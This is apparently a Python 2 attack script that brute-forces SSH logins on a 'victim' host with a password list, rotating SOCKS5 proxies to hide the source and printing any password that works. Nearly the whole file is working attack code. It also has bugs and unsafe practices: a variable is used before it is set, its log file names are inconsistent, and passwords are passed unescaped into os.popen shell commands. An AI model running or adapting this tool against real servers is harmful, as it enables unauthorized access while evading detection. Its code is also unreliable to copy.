#!/usr/bin/env python

#Autor: Adrian Ledesma Bello
#Link: https://www.canalhacker.com

## Usage: ./ssh_bruteforce_proxy.py.py <Victim ip> 22 root pass.txt proxies.txt

import sys
import paramiko
import warnings
import os
import socket
import socks
import urllib2
import threading
import time

def request(proxy, p_proxy, password):

########################## Use the proxy
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy, p_proxy)
	socket.socket = socks.socksocket
###########################

	warnings.filterwarnings(action='ignore',module='.*paramiko.*')

	hostname = sys.argv[1]
	port = sys.argv[2]
	username = sys.argv[3]

	try:
	    client = paramiko.SSHClient()
	    client.load_system_host_keys()
	    client.set_missing_host_key_policy(paramiko.WarningPolicy)

######################################################### 
#           I tryed all this options to bypass the key whey im using a proxy
#           but no one worked for me. If someone find out how do it, please, tell me. Thanks
#
#	    client.load_host_keys('/root/.ssh/known_hosts')
#           client.load_system_host_keys()
#           client.set_missing_host_key_policy(paramiko.WarningPolicy)
#           client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#           client.load_system_host_keys()
#           hostkey = ""
#           hostkey = paramiko.py3compat.decodebytes(hostkey)
#           keyObj = RSAKey(data=hostkey)
#           keyObj = RSAKey(data=decodebytes(know_host_key.encode()))
#           client.get_host_keys().add(hostname=hostname, keytype="ssh-rsa", key=keyObj)
#           chan = client.get_transport().open_session()
#############################################################
	
	
	
	    client.connect(hostname, port=port, username=username, password=password, timeout=10)
	    print ">>>>>>>>>>>>>>>>  Success: " + password
	    client.close()
	    exit()
	except Exception as e:
	   if 'Authentication failed.' in e:
		script = "echo " + password+ " >> .done.txt"
		os.popen(script)
	   else:
		script = "echo " + password+ " >> no_done.txt"
		os.popen(script)
		print "WRONG"


pass_file = open(sys.argv[4])
lines_pass = pass_file.readlines()

script = "cat " + sys.argv[4] + "| wc -l"
leng_pass = os.popen(script).read() #### Get number of passwords
script = "cat " + sys.argv[5] + "| wc -l"
leng_proxy = os.popen(script).read() #### Get number of proxies

proxy_file = open(sys.argv[5])
lines_proxy = proxy_file.readlines()
proxy_pos = 0


for pos in range(0,int(leng_pass)):

    if proxy_pos >= int(leng_proxy):
        proxy_pos = 0
    proxy = (lines_proxy[proxy_pos]).rstrip()
    ip_proxy = proxy.split()[0]
    port_proxy = int(proxy.split()[1])
    proxy_pos = proxy_pos + 1
    password = (lines_pass[pos]).rstrip()

    try:
        t1 = threading.Thread(target=request,args=(ip_proxy, port_proxy, password))
        t1.start()
        time.sleep(0.3)
    except:
        script = "echo " + password+ " >> .no_done.txt"
        os.popen(script)

    if pos%40 == 0 and pos != 0 or int(os.popen('cat .ch').read()) == 1:
        time.sleep(3)
        script = "cat .no_done.txt| wc -l"
        n = int(os.popen(script).read())
        script = "cat .done.txt| wc -l"
        d = int(os.popen(script).read())

        print "CHECK RESULT"
        r = d - n - rr
        rr = rr + r
        print str(r) + " Diferencia"

        if r < 0 or int(os.popen('cat .ch').read()) == 1:
            print "CHANGING PROXY"
            proxy_pos = proxy_pos + 1
